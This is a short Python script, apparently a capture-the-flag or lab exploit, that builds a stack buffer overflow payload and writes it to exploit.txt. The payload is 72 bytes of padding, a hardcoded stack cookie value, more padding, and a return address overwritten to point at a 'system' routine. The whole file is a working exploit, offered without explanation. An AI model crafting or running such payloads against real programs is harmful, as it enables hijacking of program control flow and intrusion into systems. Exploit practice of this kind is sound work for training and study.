import struct 

sys_add = 0x4007be
#sys_add = 0x4008be
#exit0 = 0x00000000004006c5
cookie = 0x1337133713371337
payload = 'A'*72 + struct.pack("<Q",cookie) + 'A'*8 + struct.pack("<Q",sys_add) 
f = open("exploit.txt", 'wb+')
f.write(payload)
f.close() 
